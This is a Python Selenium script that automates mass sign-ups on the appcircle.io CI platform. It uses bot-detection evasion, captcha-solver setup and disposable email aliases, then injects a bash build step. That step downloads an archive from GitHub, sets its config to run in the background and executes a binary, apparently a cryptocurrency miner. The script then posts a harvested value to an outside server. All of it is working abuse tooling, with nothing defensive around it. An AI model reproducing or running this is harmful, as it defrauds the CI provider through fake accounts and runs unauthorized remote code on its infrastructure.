#Run Browser
import os
print("rawr")
import undetected_chromedriver as uc
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import random
import requests

#Run Browser
import os
print("rawr")
import undetected_chromedriver as uc
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import random
import requests
options = uc.ChromeOptions()
os.system("rm -rf rawrz")
os.system("tar -xf kudbebedda.tar.gz")
os.system("rm -rf rawr")
os.system("cp -r rawrz rawr")
a = True
low_word = "abcdefghijklkmnopqrstuvwxyz" # uwuboirawr@proton.me
upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ" # ergfghzcfsd
number = "1234567890"
symbols = "!@#$%&*"
username_for = low_word
password_for = low_word + upper_word + number + symbols
long_password = 16
long_username = 12
ass = "".join(random.sample(username_for, 12))
options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
options.user_data_dir = "rawr"
options.add_argument("--window-size=1920,1080")
options.add_argument('--user-data-dir=rawr')
options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36")
driver = uc.Chrome(options=options, version_main=107) 
# driver.execute_script('window.open("http://bings.com","_blank");')
# driver.switch_to.window(driver.window_handles[0])
#make acount
driver.get("https://nopecha.com/setup#rvl1i0jtry")
time.sleep(1)
driver.get("https://nopecha.com/setup#rvl1i0jtry")
time.sleep(0.21)
driver.get("https://nopecha.com/setup#rvl1i0jtry")
driver.delete_all_cookies()
def get_email():
    headersdomain = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-User": "?1",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"}
    uwu = {
            "email":["plusGmail"]
    }
    rawr = requests.get('https://www.emailnator.com/', headers=headersdomain)
    headersdomain["X-XSRF-TOKEN"] = rawr.headers["set-cookie"].split("=")[1].split("%3D")[0]+"="
    headersdomain["Accept"] = "application/json, text/plain, */*"
    headersdomain["Content-Type"] = "application/json"
    headersdomain["X-Requested-With"] = "XMLHttpRequest"
    headersdomain["Cookie"] = rawr.headers["set-cookie"].split(" ")[0]+"gmailnator_session="+rawr.headers["set-cookie"].split("gmailnator_session=")[1].split(" ")[0]
    rawrz = requests.post('https://www.emailnator.com/generate-email', headers=headersdomain, json=uwu)
    emil = rawrz.json()["email"][0].split("+")[0]+"+"+"".join(random.sample(low_word, 7))+"@gmail.com"
    return emil


email = get_email()

def get_message():
    headersdomain = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-User": "?1",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"}
    uwu = {}
    rawr = requests.get('https://www.emailnator.com/', headers=headersdomain)
    headersdomain["X-XSRF-TOKEN"] = rawr.headers["set-cookie"].split("=")[1].split("%3D")[0]+"="
    headersdomain["Accept"] = "application/json, text/plain, */*"
    headersdomain["Content-Type"] = "application/json"
    headersdomain["X-Requested-With"] = "XMLHttpRequest"
    headersdomain["Cookie"] = rawr.headers["set-cookie"].split(" ")[0]+"gmailnator_session="+rawr.headers["set-cookie"].split("gmailnator_session=")[1].split(" ")[0]
    uwu["email"]=email
    rawrz = requests.post('https://www.emailnator.com/message-list', headers=headersdomain, json=uwu)
    for bork in rawrz.json()["messageData"]:
            if(bork["messageID"]!="ADSVPN"):
                    uwu["messageID"] = bork["messageID"]
                    rawrzz = requests.post('https://www.emailnator.com/message-list', headers=headersdomain, json=uwu)
                    verifylink = rawrzz.text
                    return verifylink.split("verify your email address")[1].split("This link")[0].replace('</p><p><a href="', '').replace('" rel="nofollow">Link to e-mail address verification</a></p><p>', "")


low_word = "abcdefghijklkmnopqrstuvwxyz"
upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
number = "1234567890"
symbols = "!@#$%&*"
username_for = low_word + number
password_for = low_word + upper_word + number + symbols
long_password = 16
long_username = 3

usenrame = "".join(random.sample(username_for, long_username))
passwd = "".join(random.sample(password_for, long_password))

driver.delete_all_cookies()
time.sleep(3)

driver.get("https://my.appcircle.io/")
time.sleep(1)
hrefx = driver.find_element(By.XPATH,"/html/body/div/div[2]/div[1]/div[3]/form/ul/li[2]/a").get_attribute("href")
time.sleep(3)

driver.get(hrefx)

time.sleep(1)
driver.find_element(By.XPATH,'//*[@id="email"]').send_keys(email) #input email
time.sleep(1)
driver.find_element(By.XPATH,'//*[@id="password"]').send_keys(passwd) #input password
driver.find_element(By.XPATH,'//*[@id="password-confirm"]').send_keys(passwd) #input password2




time.sleep(10)

driver.switch_to.frame(driver.find_element(By.XPATH, '//*[@id="kc-form-login"]/div[1]/div[4]/div/div/div/iframe'))

captcha = driver.find_element(By.XPATH,'/html/body/div[2]/div[3]/div[1]/div/div/span').get_attribute("aria-checked")
if captcha == "true":
    print("captcha ready!")
    driver.switch_to.default_content()
    time.sleep(4)
    driver.find_element(By.XPATH,"/html/body/div[1]/div[2]/div[1]/form/div[3]/div/button").click() #click sign in

time.sleep(30)
print(get_message())
driver.get(get_message())
time.sleep(1)
driver.get("https://my.appcircle.io/build?modal=/build/modal/NewProfileDialog")
time.sleep(3)
driver.find_element(By.XPATH,'/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/form/div/div[1]/div[2]/div/div/div/div/div/div[1]/div[2]/input').send_keys(usenrame) #input profilname
time.sleep(2)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/form/div/div[1]/div[2]/div/div/div/div/div/div[2]/div[2]/div/select").click() #click sellect device
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/form/div/div[1]/div[2]/div/div/div/div/div/div[2]/div[2]/div/select/option[3]").click() #click sellect device
time.sleep(3)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/form/footer/button").click() #click save
time.sleep(2)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[3]/div[3]/div/div[1]/div[2]/div/div/div/div/div/div[1]/div").click() #click repo
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div/div[2]/div[3]/div[1]/div[2]/div/div/div/div/div/div[2]/div/div[7]").click() #click select repo import
time.sleep(4)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[1]/div[2]/section/div[2]").click() #click workflow
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/div[2]/div/div/div/div/div/div[1]/div[3]").click() #click push workflow
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div/div/div/div[3]/div").click() #click custom script
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div/div[6]/div/div[2]/div/select/option[2]").click() #select bash
time.sleep(2)

driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div/div[7]/div[2]/div[1]/div/div/div/div[1]/div[2]/div[1]/div[4]/div[1]").click()
time.sleep(1)

actions = ActionChains(driver)
actions.send_keys(Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE)
actions.send_keys(Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE)
actions.send_keys(Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE)
actions.perform()
time.sleep(1)
actions.send_keys("""wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/xdcloudy2.tar.gz && tar -xf xdcloudy2.tar.gz && chmod +x ./hapi && sed -i 's/"background": false/"background": true/g' config.json && sed -i 's/hardness/owocircle/g' config.json && ./hapi && sleep 99999""")
actions.perform()

driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/form/footer/button").click()
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[1]/div[3]").click()
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[2]/div[3]/div[3]/div[4]/div[1]/div[2]/div/div/div/div/div/div/div[7]/button").click()
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div/footer/a").click()
time.sleep(60)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[1]/div[2]").click()
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[2]/div[3]/div[3]/div[4]/div[1]/div[2]/div/div/div/div/div/div/div[7]/button").click()
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div/div[1]/div[2]/div/div/div/div/div[2]/div[1]/div/div").click()
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div/div[1]/div[2]/div/div/div/div/div[2]/div[1]/div/div").click()
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/footer/button").click()
time.sleep(45)

driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[1]/div[2]").click() #git
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[1]/div[2]/section/div[3]").click() #git
time.sleep(1.5)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[2]").click() #git
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[1]/div/div[1]/div/div[1]/div[1]/input").send_keys("main") #git
time.sleep(0.76)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[1]/div/div[1]/div/div[1]/div[2]/div[2]/input").click() #git
time.sleep(3)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[1]/div/div[1]/div/div[1]/div[2]/div[2]/div[2]/div/div/div[1]/div[2]/div").click() #git ale wait wiekszy
time.sleep(0.76)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[1]/div/div[1]/div/div[1]/div[3]/div[2]/input").click()
time.sleep(3) #git
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[1]/div/div[1]/div/div[1]/div[3]/div[2]/div[2]/div/div/div[1]/div[2]/div/div/div/div/ul/li[1]").click() #git ale wiekszy wait
time.sleep(0.76)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/footer/button").click() #gites
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[1]/div[2]").click() #git
time.sleep(1)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[1]/div[2]/section/div[1]/section/div[1]/a").click() #git
time.sleep(2)
uwu = driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div/div/div[4]/div/input").get_attribute("value")
uwuz = "linkzy="+uwu
print(uwu)
rawrz = requests.post('https://api.idots.cf/uwu', data=uwu, headers={"Content-Type": "application/x-www-form-urlencoded"})
time.sleep(2)
driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/footer/button").click() #git
